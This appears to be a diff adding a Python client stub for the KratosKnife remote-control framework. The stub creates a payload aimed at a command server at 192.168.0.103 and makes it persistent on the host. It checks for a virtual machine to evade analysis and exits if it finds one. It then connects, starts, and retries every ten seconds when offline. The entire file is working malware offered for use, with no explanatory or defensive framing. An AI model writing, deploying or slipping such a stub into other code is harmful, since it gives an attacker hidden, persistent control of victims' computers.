@@ -1,0 +1,23 @@
+import time, sys
+import KratosKnife as K
+
+def output_file_name_function():
+	try:
+		output_file_name = K.Payload("http://192.168.0.103/")
+		output_file_name.become_persistent(10)
+		output_file_name.detect_vm_and_quit()
+		output_file_name.connect()
+		output_file_name.start()
+	except Exception as e:
+		if str(e)[:18] == "HTTPConnectionPool":
+			print("[*] Offline, Trying to Connection After 10 Sec")
+			time.sleep(10)
+			output_file_name_function()
+		else:
+			print(f"[Error] : {e}")
+			sys.exit()
+
+	except KeyboardInterrupt:
+		sys.exit()
+
+output_file_name_function()
